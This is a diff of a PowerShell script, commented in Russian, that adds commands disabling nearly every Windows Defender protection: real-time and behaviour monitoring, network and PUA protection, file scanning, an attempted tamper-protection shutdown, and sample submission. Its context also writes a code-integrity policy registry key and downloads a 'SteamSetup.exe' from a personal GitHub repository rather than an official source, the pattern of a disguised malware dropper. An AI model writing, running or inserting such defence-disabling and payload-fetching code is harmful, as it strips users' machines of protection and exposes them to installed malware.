@@ -1,4 +1,29 @@
 Set-MpPreference -EnableControlledFolderAccess Disabled
+
+# 1. Выключаем защиту в реальном времени
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# 2. Выключаем мониторинг поведения (Behavior Monitor)
+Set-MpPreference -DisableBehaviorMonitoring $true
+
+# 3. Выключаем защиту от нежелательных приложений (PUA)
+Set-MpPreference -PUAProtection 0
+
+# 4. Выключаем сканирование при доступе к файлам (IOAV)
+Set-MpPreference -DisableIOAVProtection $true
+
+# 5. Выключаем защиту от сетевых угроз (Network Protection)
+Set-MpPreference -DisableNetworkProtection $true
+
+# 6. Выключаем проверку блокируемых файлов
+Set-MpPreference -DisableBlockAtFirstSeen $true
+
+# 7. Пытаемся вырубить защиту от изменений (Tamper Protection)
+# Скорее всего выдаст ошибку, но пробуем:
+Set-MpPreference -DisableTamperProtection $true
+
+# 8. Отключаем отправку образцов данных (чтобы не базарил с микрософтом)
+Set-MpPreference -SubmitSamplesConsent 2
 # Создаём ключ, если его нет
 New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
 
@@ -93,6 +118,7 @@ catch {
     Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
     
     
+
 
 
 
